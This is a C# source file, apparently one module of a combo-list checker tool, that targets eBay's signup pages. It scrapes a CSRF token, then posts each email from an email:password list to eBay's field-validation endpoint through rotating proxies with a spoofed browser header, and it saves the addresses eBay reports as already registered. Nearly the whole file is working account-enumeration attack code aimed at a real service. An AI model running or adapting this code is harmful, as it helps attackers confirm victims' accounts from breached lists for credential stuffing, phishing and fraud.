using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class Ebay
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
                httpRequest.AddHeader("accept-language", "en-US,en;q=0.9,bn-IN;q=0.8,bn;q=0.7");
                httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                string str1 = httpRequest.Get("https://signup.ebay.com/pa/crte?siteihttps://reg.ebay.com/reg/ajax=0&co_partnerId=0&UsingSSL=1&rv4=1&pageType=2561280&ru=https%3A%2F%2Fwww.ebay.com%2Fmys%2Fhome%3Fsource%3DGBH&signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26pageType%3D2561280%26ru%3Dhttps%253A%252F%252Fwww.ebay.com%252Fmys%252Fhome%253Fsource%253DGBH%27?}?").ToString();
                if (str1.Contains("fieldValidationCSRFToken"))
                {
                    string str2 = Cryptography.LR(str1, ",\"fieldValidationCSRFToken\":\"", "\"").FirstOrDefault();
                    Console.WriteLine(str2);
                    httpRequest.AddHeader("Accept", "*/*");
                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                    httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,bn-IN;q=0.8,bn;q=0.7");
                    httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                    httpRequest.AddHeader("Host", "signin.ebay.com");
                    httpRequest.AddHeader("Origin", "https://signin.ebay.com");
                    httpRequest.AddHeader("sec-ch-ua", "\" Not; A Brand\";v=\"99\", \"Google Chrome\";v=\"91\", \"Chromium\";v=\"91\"");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36");
                    httpRequest.AddHeader("X-eBay-Requested-With", "XMLHttpRequest");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    string str3 = httpRequest.Post("https://signup.ebay.com/ajax/validatefield", "{\"fieldName\":\"email\",\"email\":\"" + strArray1[0] + "\", \"srt\":\"" + str2 + "\"}", "application/json").ToString();
                    if (str3.Contains("Your email address is already registered with eBay"))
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Green);
                        }
                        Program.Save(combo, "Apple VM");
                        return true;
                    }
                    else if (str3.Contains("{\"valid\":true}") || str3.Contains("Email address is invalid. Please enter a valid email address"))
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        //Program.Save(combo, "Invalids");
                        return true;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
    }
}
